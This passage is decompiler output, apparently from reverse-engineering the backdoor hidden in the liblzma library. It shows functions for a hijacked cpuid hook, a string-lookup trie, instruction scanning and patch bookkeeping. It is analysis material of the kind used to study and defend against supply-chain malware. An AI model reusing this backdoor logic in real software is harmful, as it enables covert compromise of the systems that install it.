  v6 = hijacked_cpuid(a1 & 0x80000000, _r9);
  if ( !v6 || v6 < a1 )
    return 0LL;
  cpuid(a1, a2, a3, a4, a5);
  return 1LL;
}

//----- (000000000000A890) ----------------------------------------------------
__int64 __fastcall count_1_bits(__int64 a1)
{
  __int64 result; // rax

  result = 0LL;
  while ( a1 )
  {
    result = (unsigned int)(result + 1);
    a1 &= a1 - 1;
  }
  return result;
}

//----- (000000000000A8B0) ----------------------------------------------------
// 0x00007ffff7fabe70
char *__fastcall table_get(char *a1, unsigned __int64 a2)
{
  char *v2; // rbx
  _BOOL4 v3; // edx
  char *result; // rax
  char *v5; // r8
  char *v6; // r9
  __int64 *i; // rsi
  int v8; // ecx
  unsigned __int64 v9; // r10
  unsigned __int64 v10; // rdx
  char *v11; // rax
  __int16 v12; // cx
  __int16 v13; // dx

  v2 = a1;
  v3 = apply_one_entry_ex(0LL, 0xAu, 8u, 1u);
  result = 0LL;
  if ( v3 )
  {
    v5 = a1 + 44;
    if ( a2 && (unsigned __int64)v5 > a2 )
      v5 = (char *)a2;
    v6 = (char *)&trie_table1 + 0x13E8;
    for ( i = (__int64 *)((char *)&trie_table2 + 0x760); v5 >= v2; i = (__int64 *)((char *)i + (__int16)(v13 - 16)) )
    {
      LOBYTE(v8) = *v2;
      if ( *v2 < 0 )
        break;
      if ( (unsigned __int8)v8 > 0x3Fu )
      {
        if ( (((unsigned __int64)i[1] >> ((unsigned __int8)v8 - 64)) & 1) == 0 )
          return 0LL;
        LODWORD(result) = count_1_bits(*i);
      }
      else
      {
        v9 = *i;
        result = 0LL;
        if ( (((unsigned __int64)*i >> v8) & 1) == 0 )
          return result;
      }
      v8 = (unsigned __int8)v8;
      while ( 1 )
      {
        _BitScanForward64(&v10, v9);
        if ( (_DWORD)v10 == v8 )
          break;
        LODWORD(result) = (_DWORD)result + 1;
        v9 &= v9 - 1;
      }
      v11 = &v6[4 * (unsigned int)result];
      v12 = *(_WORD *)v11;
      result = (char *)(unsigned int)*((__int16 *)v11 + 1);
      if ( (v12 & 4) != 0 )
        return result;
      if ( (v12 & 2) != 0 )
        v12 &= ~2u;
      else
        LODWORD(result) = -(int)result;
      v13 = v12 & 0xFFFE;
      if ( (v12 & 1) == 0 )
        v13 = -v12;
      ++v2;
      v6 += (__int16)((_WORD)result - 4);
    }
    return 0LL;
  }
  return result;
}
// A90E: variable 'v5' is possibly undefined
// A950: variable 'v8' is possibly undefined
// A953: variable 'v9' is possibly undefined
// A968: variable 'v6' is possibly undefined

//----- (000000000000A9C0) ----------------------------------------------------
__int64 __fastcall Llzma_lzma_encoder_init_0(__int64 a1, unsigned int *a2)
{
  unsigned int v2; // eax
  int v3; // ecx
  unsigned int v4; // ecx

  v2 = *a2;
  if ( *a2 <= 0x1C7 )
  {
    v3 = *(_DWORD *)(a1 + 40);
    if ( v3 != 265 && v3 != 187 )
    {
      v4 = v3 - 131;
      if ( v4 > 0x2E || ((0x410100000101uLL >> v4) & 1) == 0 )
        *((_BYTE *)&global_ctx->field_108 + (v2 >> 3)) |= 1 << (v2 & 7);
    }
    *a2 = v2 + 1;
  }
  return 1LL;
}

//----- (000000000000AA30) ----------------------------------------------------
_BOOL8 __fastcall apply_method_2(__int64 a1, __int64 a2, int a3, unsigned int a4, int a5)
{
  __int64 v7; // rcx
  __int64 *v8; // rdi
  __int64 v10; // r12
  int v11[3]; // [rsp+Ch] [rbp-9Ch] BYREF
  __int64 v12; // [rsp+18h] [rbp-90h] BYREF
  __int64 v13; // [rsp+20h] [rbp-88h]

  v7 = 22LL;
  v8 = &v12;
  while ( v7 )
  {
    *(_DWORD *)v8 = 0;
    v8 = (__int64 *)((char *)v8 + 4);
    --v7;
  }
  v11[0] = a3;
  if ( a5 )
  {
    if ( !(unsigned int)Llzma_optimum_normal_0(a1, a2, 0LL, &v12) )
      return 0LL;
    a1 = v12 + v13;
  }
  v10 = 0LL;
  while ( (unsigned int)Llzma_block_total_size_0(a1, a2, &v12) )
  {
    if ( v10 == a4 )
    {
      if ( a4 < (unsigned int)v10 )
        return 0LL;
      return a4 == (_DWORD)v10;
    }
    ++v10;
    if ( !(unsigned int)Llzma_lzma_encoder_init_0(&v12, v11) )
      return 0LL;
    a1 = v12 + v13;
  }
  return a4 == (_DWORD)v10;
}
// C80: using guessed type __int64 __fastcall Llzma_optimum_normal_0(_QWORD, _QWORD, _QWORD, _QWORD);
// A9C0: using guessed type __int64 __fastcall Llzma_lzma_encoder_init_0(_QWORD, _QWORD);
// AC70: using guessed type __int64 __fastcall Llzma_block_total_size_0(_QWORD, _QWORD, _QWORD);
// AA30: using guessed type int var_9C[3];

//----- (000000000000AAF0) ----------------------------------------------------
__int64 __fastcall apply_one_entry_internal(__int64 a1, _DWORD *a2, unsigned int a3, unsigned int a4, unsigned int a5)
{
  struct_ctx *v5; // rax
  __int64 v9[6]; // [rsp+8h] [rbp-30h] BYREF

  v9[0] = 0LL;
  v5 = global_ctx;
  if ( global_ctx && !*((_BYTE *)&global_ctx->field_140 + a5 + 1) )
  {
    *((_BYTE *)&global_ctx->field_140 + a5 + 1) = 1;
    if ( !(unsigned int)apply_method_1(a2, v9, 0LL, (_DWORD *)v5->field_80, v5->field_88, 1)
      || !(unsigned int)apply_method_2(v9[0], global_ctx->field_88, a3, a4, a1 == 0) )
    {
      return 0LL;
    }
    global_ctx[1].field_8 += a4;
  }
  return 1LL;
}
// AA30: using guessed type __int64 __fastcall apply_method_2(_QWORD, _QWORD, _QWORD, _QWORD, _QWORD);
// AAF0: using guessed type __int64 var_30[6];

//----- (000000000000ABA0) ----------------------------------------------------
__int64 __fastcall apply_one_entry(unsigned int a1, unsigned int a2, unsigned int a3, int a4, _DWORD *a5)
{
  if ( a4 )
    return apply_one_entry_internal((__int64)a5, a5, a1, a3, a2);
  else
    return 0LL;
}

//----- (000000000000ABC0) ----------------------------------------------------
_BOOL8 __fastcall apply_one_entry_ex(unsigned __int64 a1, unsigned int a2, unsigned int a3, unsigned int a4)
{
  unsigned __int64 v4; // rax
  unsigned __int64 retaddr; // [rsp+0h] [rbp+0h]

  v4 = a1;
  if ( a1 <= 1 )
    v4 = retaddr;
  return (int)apply_one_entry_internal(a1, v4, a2, a3, a4) > 0;
}
// AAF0: using guessed type __int64 __fastcall Lrc_read_init_part_0(_QWORD, _QWORD, _QWORD, _QWORD, _QWORD);

//----- (000000000000ABF0) ----------------------------------------------------
__int64 __fastcall Llzma_index_iter_rewind_cold(unsigned int a1, unsigned int a2, unsigned int a3, int a4)
{
  _DWORD *retaddr; // [rsp+8h] [rbp+0h]

  return a4 | (unsigned int)apply_one_entry_internal(0LL, retaddr, a1, a2, a3);
}

//----- (000000000000AC10) ----------------------------------------------------
__int64 __fastcall apply_entries(
        __int64 a1,
        unsigned __int64 a2,
        __int64 (__fastcall *a3)(_QWORD, _QWORD, _QWORD, _QWORD, _QWORD))
{
  unsigned int v3; // r14d
  int v5; // ebp
  __int64 v6; // rax
  __int64 v7; // rax
  __int64 result; // rax

  v3 = 0;
  v5 = 0;
  while ( 1 )
  {
    v6 = v3;
    if ( v3 >= a2 )
      break;
    ++v3;
    v7 = a1 + 24 * v6;
    if ( *(_DWORD *)(v7 + 20) )
    {
      result = a3(*(unsigned int *)(v7 + 8), *(unsigned int *)(v7 + 12), *(unsigned int *)(v7 + 16), v3, *(_QWORD *)v7);
      if ( !(_DWORD)result )
        return result;
      ++v5;
    }
    else
    {
      *(_DWORD *)(v7 + 20) = v5;
    }
  }
  return 1LL;
}

//----- (000000000000AC70) ----------------------------------------------------
__int64 __fastcall Llzma_block_total_size_0(unsigned __int64 a1, unsigned __int64 a2, __int64 a3)
{
  if ( !a3 )
    return 0LL;
  while ( 1 )
  {
    if ( a1 >= a2 || !(unsigned int)code_dasm((_DWORD *)a3, a1, a2) )
      return 0LL;
    if ( ((*(_DWORD *)(a3 + 40) & 0xFFFFFFFD) == 265
       || (unsigned int)(*(_DWORD *)(a3 + 40) - 129) <= 0x3A
       && ((0x505050500000505uLL >> (*(_BYTE *)(a3 + 40) + 127)) & 1) != 0)
      && (*(_WORD *)(a3 + 16) & 0xF80) == 0
      && (*(_BYTE *)(a3 + 27) & 5) == 0
      && *(_BYTE *)(a3 + 29) == 3 )
    {
      break;
    }
    a1 = *(_QWORD *)a3 + *(_QWORD *)(a3 + 8);
  }
  return 1LL;
}

// nfuncs=127 queued=123 decompiled=123 lumina nreq=0 worse=0 better=0
// ALL OK, 123 function(s) have been successfully decompiled
